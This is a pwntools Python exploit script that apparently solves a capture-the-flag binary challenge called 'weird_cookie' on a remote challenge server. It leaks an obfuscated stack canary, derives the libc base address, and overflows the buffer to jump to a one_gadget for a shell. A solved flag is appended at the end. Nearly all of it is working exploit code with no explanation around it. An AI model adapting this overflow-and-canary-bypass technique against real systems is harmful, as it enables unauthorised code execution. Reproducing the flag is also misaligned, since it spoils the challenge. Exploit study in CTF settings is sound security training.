#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./weird_cookie_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = gdb.debug([exe.path])
	elif args.REMOTE:
		r = remote("challenge.nahamcon.com", 30819)
	else:
		r = process([exe.path])
	return r


def main():
	r = conn()

	offset = 40

	payload = b''.join([
		b'A' * offset,
	])

	r.send(payload)
	prompt = r.recvuntil(b'A' * offset)
	print(prompt)
	canary = u64(r.recv(8).ljust(8, b"\x00"))
	libc.address = (canary ^ 0x123456789ABCDEF1) - libc.symbols["printf"]
	success(f'{hex(canary)=}')
	success(f'{hex(libc.address)=}')

	one_gadget = 0x4f302 # [rsp+0x40] == NULL

	payload = b''.join([
		b'\x00' * offset,
		p64(canary),
		p64(0),
		p64(libc.address + one_gadget)
	])

	r.recvuntil(b'.\n')
	r.sendline(payload)


	r.interactive()


if __name__ == "__main__":
	main()

# flag{e87923d7cd36a8580d0cf78656d457c6}
